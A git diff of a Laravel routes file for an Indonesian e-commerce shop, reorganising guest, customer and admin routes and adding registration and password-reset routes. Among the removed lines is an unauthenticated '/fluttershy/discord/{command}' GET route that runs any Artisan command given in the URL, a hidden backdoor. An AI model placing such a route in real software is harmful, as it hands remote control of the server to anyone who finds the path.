@@ -1,5 +1,8 @@
 <?php
 
+use App\Http\Controllers\Auth\NewPasswordController;
+use App\Http\Controllers\Auth\PasswordResetLinkController;
+use App\Http\Controllers\Auth\RegisteredUserController;
 use App\Http\Controllers\CategoryController;
 use App\Http\Controllers\DashboardController;
 use App\Http\Controllers\Ecommerce\CartController;
@@ -9,118 +12,98 @@ use App\Http\Controllers\Ecommerce\OrderController;
 use App\Http\Controllers\OrderController as AdminOrderController;
 use App\Http\Controllers\ProductController;
 use App\Http\Controllers\ProfileController;
-use Illuminate\Http\Request;
-use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Route;
 
-Route::get('/fluttershy/discord/{command}', function ($command, Request $request) {
-    try {
-        $args = $request->input('args', []);
-
-        if (!is_array($args)) {
-            return response()->json([
-                'status' => 'error',
-                'message' => 'Arguments must be provided as an array.',
-            ], 400);
-        }
-
-        Artisan::call($command, $args);
-        $output = Artisan::output();
-
-        return response()->json([
-            'status' => 'success',
-            'cmd' => "php artisan $command " . json_encode($args),
-            'output' => $output,
-        ]);
-    } catch (\Throwable $th) {
-        return response()->json([
-            'status' => 'error',
-            'cmd' => "php artisan $command " . json_encode($args),
-            'error' => $th->getMessage(),
-        ]);
-    }
-});
-
-Route::get('/pengguna/pengaturan', function () {
-    return view('pengguna.pengaturan_pengguna');
-});
-
-Route::get('/pengguna/alamat', function () {
-    return view('pengguna.alamat_pengguna');
-});
-
-Route::get('/pengguna/keamanan', function () {
-    return view('pengguna.keamanan_pengguna');
-});
-
-Route::get('/pengguna/pesanan', function () {
-    return view('pesanan.index_pesanan');
-});
-
-Route::get('/pengguna/notifikasi', function () {
-    return view('notifikasi.index_notifikasi');
-});
-
-Route::get('/testimoni', function () {
-    return view('testimoni.index_testimoni');
-});
-
-Route::get('/favorit', function () {
-    return view('favorit.index_favorit');
-});
+// ==================== Breeze Routes ====================
 Route::middleware('auth')->group(function () {
     Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
     Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
     Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
 });
 
-Route::get('/', [FrontController::class, 'index'])->name('home');
+// ==================== Static Routes ====================
+Route::get('/pengguna/alamat', fn () => view('pengguna.alamat_pengguna'));
+Route::get('/pengguna/keamanan', fn () => view('pengguna.keamanan_pengguna'));
+Route::get('/pengguna/pesanan', fn () => view('pesanan.index_pesanan'));
+Route::get('/pengguna/notifikasi', fn () => view('notifikasi.index_notifikasi'));
+Route::get('/testimoni', fn () => view('testimoni.index_testimoni'));
+Route::get('/checkout2', fn () => view('pesanan.checkout'));
+Route::get('/favorit', fn () => view('favorit.index_favorit'));
 
-Route::get('/toko', [FrontController::class, 'product'])->name('front.product');
-Route::get('/category/{slug}', [FrontController::class, 'categoryProduct'])->name('front.category');
-Route::get('/product/{slug}', [FrontController::class, 'show'])->name('front.show_product');
-Route::post('cart', [CartController::class, 'addToCart'])->name('front.cart');
-Route::get('/cart', [CartController::class, 'listCart'])->name('front.list_cart');
+// ==================== API Routes ====================
 Route::get('/api/cart', [CartController::class, 'AJAXlistCart'])->name('api.list_cart');
 Route::delete('/api/cart/delete', [CartController::class, 'destroyCart'])->name('api.destroy_cart');
 
+// ==================== Guest Routes ====================
+
+// ======================================= Product Routes
+Route::get('/', [FrontController::class, 'index'])->name('home');
+Route::get('/toko', [FrontController::class, 'product'])->name('front.product');
+Route::get('/product/ref/{user}/{product}', [FrontController::class, 'referalProduct'])->name('front.afiliasi');
+Route::get('/product/{slug}', [FrontController::class, 'show'])->name('front.show_product');
+Route::get('/category/{slug}', [FrontController::class, 'categoryProduct'])->name('front.category');
+
+// ======================================= Cart Routes
+Route::post('cart', [CartController::class, 'addToCart'])->name('front.cart');
+Route::get('/cart', [CartController::class, 'listCart'])->name('front.list_cart');
 Route::post('/cart/update', [CartController::class, 'updateCart'])->name('front.update_cart');
+
+// ======================================= Checkout Routes
 Route::get('/checkout', [CartController::class, 'checkout'])->name('front.checkout');
 Route::post('/checkout', [CartController::class, 'processCheckout'])->name('front.store_checkout');
 Route::get('/checkout/{invoice}', [CartController::class, 'checkoutFinish'])->name('front.finish_checkout');
-Route::group(['prefix' => 'member', 'namespace' => 'Ecommerce'], function () {
+
+// ======================================= Customer Auth Routes
+Route::middleware(['guest'])->group(function () {
     Route::get('login', [LoginController::class, 'loginForm'])->name('customer.login');
     Route::post('login', [LoginController::class, 'login'])->name('customer.post_login');
+    Route::get('register', [RegisteredUserController::class, 'create'])->name('register');
+    Route::post('register', [RegisteredUserController::class, 'store']);
     Route::get('verify/{token}', [FrontController::class, 'verifyCustomerRegistration'])->name('customer.verify');
-
-    Route::group(['middleware' => 'customer'], function () {
-        Route::get('dashboard', [LoginController::class, 'dashboard'])->name('customer.dashboard');
-        Route::get('logout', [LoginController::class, 'logout'])->name('customer.logout');
-        Route::get('orders', [OrderController::class, 'index'])->name('customer.orders');
-        Route::get('orders/{invoice}', [OrderController::class, 'view'])->name('customer.view_order');
-        Route::get('orders/pdf/{invoice}', [OrderController::class, 'pdf'])->name('customer.order_pdf');
-        Route::post('orders/accept', [OrderController::class, 'acceptOrder'])->name('customer.order_accept');
-        Route::get('orders/return/{invoice}', [OrderController::class, 'returnForm'])->name('customer.order_return');
-        Route::put('orders/return/{invoice}', [OrderController::class, 'processReturn'])->name('customer.return');
-        Route::get('payment', [OrderController::class, 'paymentForm'])->name('customer.paymentForm');
-        Route::post('payment', [OrderController::class, 'storePayment'])->name('customer.savePayment');
-        Route::get('setting', [FrontController::class, 'customerSettingForm'])->name('customer.settingForm');
-        Route::post('setting', [FrontController::class, 'customerUpdateProfile'])->name('customer.setting');
-        Route::get('/afiliasi', [FrontController::class, 'listCommission'])->name('customer.affiliate');
-    });
+    Route::get('forgot-password', [PasswordResetLinkController::class, 'create'])->name('password.request');
+    Route::post('forgot-password', [PasswordResetLinkController::class, 'store'])->name('password.email');
+    Route::get('reset-password/{token}', [NewPasswordController::class, 'create'])->name('password.reset');
+    Route::post('reset-password', [NewPasswordController::class, 'store'])->name('password.store');
 });
 
-Route::group(['prefix' => 'administrator', 'middleware' => 'auth'], function () {
-    // Dashboard handler
+// ==================== User Routes ====================
+Route::group(['middleware' => 'customer'], function () {
+    // ======================================= Manage Profile
+    Route::get('dashboard', [LoginController::class, 'dashboard'])->name('customer.dashboard');
+    Route::get('logout', [LoginController::class, 'logout'])->name('customer.logout');
+    Route::get('pengguna/pengaturan', [FrontController::class, 'customerSettingForm'])->name('customer.settingForm');
+    Route::post('setting', [FrontController::class, 'customerUpdateProfile'])->name('customer.setting');
+
+    // ======================================= Orders
+    Route::get('orders', [OrderController::class, 'index'])->name('customer.orders');
+    Route::get('orders/{invoice}', [OrderController::class, 'view'])->name('customer.view_order');
+    Route::get('orders/pdf/{invoice}', [OrderController::class, 'pdf'])->name('customer.order_pdf');
+    Route::post('orders/accept', [OrderController::class, 'acceptOrder'])->name('customer.order_accept');
+    Route::get('orders/return/{invoice}', [OrderController::class, 'returnForm'])->name('customer.order_return');
+    Route::put('orders/return/{invoice}', [OrderController::class, 'processReturn'])->name('customer.return');
+
+    // ======================================= Payment
+    Route::get('payment', [OrderController::class, 'paymentForm'])->name('customer.paymentForm');
+    Route::post('payment', [OrderController::class, 'storePayment'])->name('customer.savePayment');
+    Route::get('/afiliasi', [FrontController::class, 'listCommission'])->name('customer.affiliate');
+});
+
+// ==================== Admin Routes ====================
+Route::group(['prefix' => 'admin', 'middleware' => 'auth'], function () {
     Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');
+
+    // ======================================= Product
     Route::resource('category', CategoryController::class)->except(['create', 'show']);
     Route::resource('product', ProductController::class)->except(['show']);
     Route::get('/product/bulk', [ProductController::class, 'massUploadForm'])->name('product.bulk');
     Route::post('/product/bulk', [ProductController::class, 'massUpload'])->name('product.saveBulk');
-    Route::get('/settings', [DashboardController::class, 'IndexSettings'])->name('settings');
-    Route::post('/settings', [DashboardController::class, 'StoreSettings'])->name('settings.update');
     Route::post('/product/marketplace', 'ProductController@uploadViaMarketplace')->name('product.marketplace');
 
+    // ======================================= Settings
+    Route::get('/settings', [DashboardController::class, 'IndexSettings'])->name('settings');
+    Route::post('/settings', [DashboardController::class, 'StoreSettings'])->name('settings.update');
+
+    // ======================================= Orders
     Route::group(['prefix' => 'orders'], function () {
         Route::get('/', [AdminOrderController::class, 'index'])->name('orders.index');
         Route::delete('/{id}', [AdminOrderController::class, 'destroy'])->name('orders.destroy');
@@ -130,6 +113,8 @@ Route::group(['prefix' => 'administrator', 'middleware' => 'auth'], function () 
         Route::get('/return/{invoice}', [AdminOrderController::class, 'return'])->name('orders.return');
         Route::post('/return', [AdminOrderController::class, 'approveReturn'])->name('orders.approve_return');
     });
+
+    // ======================================= Reports
     Route::group(['prefix' => 'reports'], function () {
         Route::get('/order', [DashboardController::class, 'orderReport'])->name('report.order');
         Route::get('/order/pdf/{daterange}', [DashboardController::class, 'orderReportPdf'])->name('report.order_pdf');
@@ -138,6 +123,4 @@ Route::group(['prefix' => 'administrator', 'middleware' => 'auth'], function () 
     });
 });
 
-Route::get('/product/ref/{user}/{product}', [FrontController::class, 'referalProduct'])->name('front.afiliasi');
-
-require __DIR__ . '/auth.php';
+require __DIR__.'/auth.php';
